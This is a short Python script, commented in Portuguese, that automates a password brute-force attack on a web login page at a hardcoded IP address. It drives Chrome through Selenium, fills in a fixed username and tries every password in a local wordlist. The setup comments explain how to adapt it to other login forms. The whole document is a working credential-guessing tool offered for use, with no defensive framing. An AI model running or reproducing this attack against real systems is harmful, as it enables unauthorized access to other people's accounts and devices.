# Funcao - realizar brute force em um determinado login web.
# pegar os valores dos campos com o selenium IDE.
# baixar o Chrome webdriver.
# colocar o arquivo de senhas junto com o script.

from selenium import webdriver
from time import sleep
import requests

# caminho do chrome webdriver
browser = webdriver.Chrome(
    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chromedriver.exe')

# pagina onde esta o formulario de login
browser.get('http://177.44.0.1/')

# arquivo de texto das senhas.
senha = open('senhas.txt', 'r')

# vai tentar senha por senha a partir daqui.
for s in senha:
    try:
        # preenche o nome de usuario
        sleep(3)
        log_form = browser.find_element_by_id('usernamefld')
        log_form.send_keys('USUARIO')
        sleep(2)

        # preenche a senha pela lista
        sleep(3)
        password_form = browser.find_element_by_id('passwordfld')
        password_form.send_keys(s)
        sleep(2)

        # clica em submit
        sleep(3)
        submit = browser.find_element_by_name('login')
        submit.click()
        sleep(3)
        
    # caso consiga fazer login no sistema.
    except:
        print(f'\n A ultima senha testada foi: ' + s)
        print('Ou ocorreu um erro ou Voce encontrou a senha!!')
        exit()
